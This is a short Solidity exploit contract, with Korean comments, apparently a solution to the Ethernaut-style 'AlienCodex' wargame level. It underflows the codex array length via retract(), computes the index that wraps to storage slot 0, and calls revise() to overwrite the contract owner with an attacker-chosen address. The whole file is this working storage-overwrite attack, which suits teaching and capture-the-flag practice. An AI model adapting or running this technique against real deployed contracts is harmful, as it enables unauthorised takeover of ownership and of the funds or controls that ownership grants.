// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface AlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract Attack {
    address public alien;

    constructor(address _alien) {
        alien = _alien;
    }

    function attack(address desiredOwner) external {
        AlienCodex instance = AlienCodex(alien);

        instance.makeContact();

        // 주의: 0.8.x에서 retract()가 언더플로우를 허용하지 않으면 여기서 revert됩니다.
        instance.retract();

        uint256 base = uint256(keccak256(abi.encode(uint256(1)))); // codex가 slot 1일 때

        uint256 targetIndex;
        unchecked {
            // 2^256 - base
            targetIndex = type(uint256).max - base + 1;
        }

        // owner가 address 하위 20바이트라면 아래 방식으로 정확히 캐스트
        bytes32 data = bytes32(uint256(uint160(desiredOwner)));

        instance.revise(targetIndex, data);
    }
}
